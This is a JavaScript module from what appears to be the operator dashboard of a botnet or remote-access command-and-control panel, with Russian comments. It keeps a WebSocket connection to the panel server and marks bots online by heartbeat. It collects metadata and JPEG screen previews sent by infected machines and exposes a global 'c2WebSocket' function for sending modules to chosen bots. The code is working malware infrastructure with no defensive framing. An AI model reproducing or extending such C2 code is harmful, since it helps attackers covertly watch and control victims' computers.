/* frontend/dashboard/js/modules/websocket/connection.js */
import { updateClient, updateClients, setClientPreview } from '../data/clients.js';
import { decodePacket, encodePacket } from './protocol.js';

let ws;
const decoder = new TextDecoder();

export function connectWebSocket() {
    const token = localStorage.getItem('auth_token');
    const login = localStorage.getItem('user_login');
    if (!token || !login) return;

    const prot = location.protocol === 'https:' ? 'wss:' : 'ws:';
    ws = new WebSocket(`${prot}//${location.host}/ws?login=${encodeURIComponent(login)}&token=${token}`);
    ws.binaryType = 'arraybuffer';

    ws.onopen = () => {
        console.log("🚀 [WS] Dashboard Connected");
        // Системный пинг сервера (раз в 5 сек), чтобы сервер не закрыл наше соединение
        setInterval(() => {
            if (ws?.readyState === 1) ws.send(encodePacket("", "Heartbeat", "ping"));
        }, 5000);
    };

    ws.onmessage = ({ data }) => {
        if (!(data instanceof ArrayBuffer)) return;
        const pkg = decodePacket(data);
        if (!pkg || pkg.module === 'pong') return;

        // --- ЛОГИКА СТАТУСА (HEARTBEAT) ---
        // Только этот модуль имеет право переводить бота в Online
        if (pkg.module === 'Heartbeat') {
            updateClient({ id: pkg.id }, true); // Передаем true (isLive)
            return;
        }

        // --- ЛОГИКА ДАННЫХ (DATAScribe) ---
        if (pkg.module === 'DataScribe') {
            try {
                const decodedPayload = decoder.decode(pkg.payload);
                const rawData = JSON.parse(decodedPayload);

                if (Array.isArray(rawData)) {
                    // Это массив из БД (приходит один раз при старте)
                    // Эти боты всегда попадают в список как Offline
                    updateClients(rawData);
                } else {
                    // Это метаданные (JSON) от живого бота
                    // Обновляем поля, но НЕ переводим в Online (isLive = false)
                    updateClient({ ...rawData, id: pkg.id || rawData.id }, false);
                }
            } catch (e) {
                // Если не JSON — значит это бинарное превью (JPEG)
                if (pkg.payload.byteLength > 100) {
                    const imageUrl = URL.createObjectURL(new Blob([pkg.payload], { type: 'image/jpeg' }));
                    setClientPreview(pkg.id, imageUrl);

                    window.dispatchEvent(new CustomEvent('botPreviewReceived', {
                        detail: { id: pkg.id, url: imageUrl }
                    }));
                }
            }
        }
    };

    ws.onclose = () => {
        console.warn("⚠️ [WS] Connection closed. Reconnecting in 5s...");
        setTimeout(connectWebSocket, 5000);
    };

    window.c2WebSocket = {
        send: (id, mod, pay) => ws?.readyState === 1 && ws.send(encodePacket(id, mod, pay))
    };
}